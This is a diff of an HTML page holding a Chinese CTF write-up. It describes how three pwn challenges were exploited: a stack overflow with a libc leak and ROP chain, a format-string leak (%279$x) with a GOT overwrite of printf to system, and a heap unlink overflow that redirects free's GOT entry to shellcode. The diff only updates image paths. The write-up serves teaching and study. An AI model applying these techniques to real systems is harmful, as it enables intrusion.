+<hr>
 
 <p>简单的栈溢出，利用一个字节修改输入长度，先通过泄露站上的libc中的地址获取system函数基址 /bin/sh地址，然后就是rop链</p>
 
 <h1>pwn300</h1>
 
-<hr />
+<hr>
 
 <p>格式化字符串漏洞，开了dep，没办法获得栈地址，所以通过劫持got表来实现system函数的执行。 利用步骤：</p>
 
 <ol>
 <li><p>先通过%279$x泄露获得libc&#95;start&#95;main地址</p></li>
 <li><p>根据提供的libc计算出system地址</p></li>
-<li><p>每次该两个字节劫持printf函数地址为system <img src="http://static.wooyun.org/20141209/2014120904265983048.jpeg" alt="enter image description here" /></p></li>
+<li><p>每次该两个字节劫持printf函数地址为system <img src="../images_result/images/2014120904265983048.jpeg" alt="enter image description here"></p></li>
 <li><p>发送/bin/sh，让其通过printf打印，实际上是在执行/bin/sh</p></li>
 </ol>
 
 <h1>Pwn400</h1>
 
-<hr />
+<hr>
 
 <p>看到双向链表就猜到了是模拟dlmalloc堆溢出了.在edit content的时候，输入超长，可以覆盖下一个堆块的内容，这样链表的双向指针就可以被我们控制，实现任意地址写漏洞：如下是content超长的截图：</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265930396.jpeg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265930396.jpeg" alt="enter image description here"></p>
 
 <p>要注意的是，该文件关闭了dep，那利用思路就是利用任意地址写漏洞，将shellcode地址写入某个got表，选择一个合适的函数got表很关键，最后我选择的是free函数的got表，原因是如下图所示：</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265982144.jpeg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265982144.jpeg" alt="enter image description here"></p>
 
 <p>在链表卸载后有个释放堆的函数，我们要覆盖双向指针，必然会导致堆块头部受损，保证堆块头部不出问题是个麻烦的事儿，不如直接劫持free函数，同时也不会有其他问题。</p>
 
 <p>那整体的利用顺序就是：1。申请3个note 2.编辑第一个note，设置内容覆盖第二个note的双向指针，3.释放第二个note。关键代码如下：</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265943043.jpeg" alt="enter image description here" /></p>      </p>
+<p><img src="../images_result/images/2014120904265943043.jpeg" alt="enter image description here"></p>      <p></p>
     
 			</body>
 		</html>
